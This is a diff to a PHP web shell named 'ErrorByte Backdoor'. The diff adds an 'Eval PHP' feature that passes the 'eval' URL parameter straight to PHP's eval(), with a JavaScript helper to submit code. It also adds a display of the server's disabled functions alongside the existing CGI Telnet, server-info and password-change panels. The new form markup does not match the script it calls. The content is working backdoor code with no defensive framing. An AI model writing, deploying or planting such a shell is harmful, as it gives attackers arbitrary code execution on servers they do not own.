@@ -10,6 +10,8 @@ set_time_limit(0);
 @ini_set('max_execution_time',0);
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
+$ds = @ini_get("disable_functions");
+$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "NONE";
 ?>
 <?php
 session_start();
@@ -99,6 +101,7 @@ if(!empty($_SERVER['HTTP_USER_AGENT'])) {
 $dir = $_GET['d'];
 chdir($dir);
 $direktori = getcwd();
+$cok = str_replace("'", '"', $_GET['eval']); echo eval($cok);
 ?>
 <title>ErrorByte Backdoor</title>
 <link rel="shortcut icon" type="image/x-icon" href="https://img.deusm.com/darkreading/bh-asia-facebook-profile.png">
@@ -120,11 +123,17 @@ color: red;
 text-decoration: none;
 }
 </style>
+<script type="text/javascript">
+    function evalp() {
+        var evalphp = document.getElementById('evalphp').value;
+        window.location = "?eval=" + evalphp;
+    }
+</script>
 <hr>
 <center>
 <h1>ErrorByte Backdoor</h1>
 <hr>
-[ <a href="?">Home</a> ] [ <a href="?info">Info Server</a> ] [ <a href="?cgi">CGI Telnet</a> ] [ <a href="?change">Change Password</a> ] [ <a href="?out">Logout</a> ]
+[ <a href="?">Home</a> ] [ <a href="?eval_php">Eval PHP</a> ] [ <a href="?cgi">CGI Telnet</a> ] [ <a href="?info">Info Server</a> ] [ <a href="?change">Change Password</a> ] [ <a href="?out">Logout</a> ]
 </center>
 <?php
 if(isset($_REQUEST['out'])) {
@@ -132,7 +141,13 @@ if(isset($_REQUEST['out'])) {
 	echo "<script>window.location='?';</script>";
 } elseif(isset($_REQUEST['info'])) {
 echo "<hr>";
-echo "Kernel : <font color='red'>".php_uname()."</font>";
+echo "Kernel : <font color='red'>".php_uname()."</font><br>
+Disable Function : $show_ds";
+exit;
+} elseif(isset($_REQUEST['eval_php'])) {
+echo "<hr>";
+echo '<textarea id="evalp" class="hasilshell"><br><br>
+<input onclick="KeDirektori();" type="submit" value="Go!"/>';
 exit;
 } elseif(isset($_REQUEST['change'])) {
 echo "<hr><form enctypr='multipart/post-data' method='post'>
